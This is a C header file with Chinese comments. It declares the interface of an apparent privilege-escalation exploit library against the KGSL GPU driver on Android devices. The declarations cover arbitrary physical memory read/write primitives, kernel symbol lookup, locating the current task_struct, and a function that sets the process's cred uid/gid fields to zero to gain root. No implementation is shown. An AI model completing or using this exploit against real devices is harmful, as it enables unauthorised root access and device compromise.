#ifndef GPU_PHYSICAL_MEM_H
#define GPU_PHYSICAL_MEM_H

#include <stdint.h>
#include <stddef.h>

// 初始化模块，必须在使用前调用一次
// kgsl_fd: 已打开的 /dev/kgsl-3d0 文件描述符
// ioctl_type, drawctxt_create, map_user_mem, gpu_command, gpumem_alloc, gpumem_free: 通过探测得到的 ioctl 命令号
// context_id: 已创建的 KGSL 上下文 ID（可为 0）
int gpu_phys_init(int kgsl_fd, int ioctl_type, int drawctxt_create, int map_user_mem,
                  int gpu_command, int gpumem_alloc, int gpumem_free, int context_id);

// 物理内存读写原语（单次 8 字节）
uint64_t gpu_phys_read64(uint64_t phys_addr);
int gpu_phys_write64(uint64_t phys_addr, uint64_t value);

// 任意长度读写（建议长度不超过 PAGE_SIZE，自动分页）
int gpu_phys_read(uint64_t phys_addr, void *buf, size_t len);
int gpu_phys_write(uint64_t phys_addr, const void *buf, size_t len);

// 从 /proc/kallsyms 读取内核符号地址（需要 root 或漏洞已提权）
uint64_t gpu_phys_find_symbol(const char *symbol);

// 自动提权：修改当前进程的 cred 结构体中的 uid/gid/euid/egid 等为 0
// 需要提供 current_task 的地址（可通过 find_task_by_vpid 获得，或使用内部方法）
// 若不知道 current_task，可调用 gpu_phys_find_current_task() 尝试自动查找
int gpu_phys_escalate_privileges(void);

// 辅助函数：查找当前进程的 task_struct 地址（通过内核符号和物理内存扫描）
uint64_t gpu_phys_find_current_task(void);

// 清理模块（释放内部资源，可选）
void gpu_phys_cleanup(void);

#endif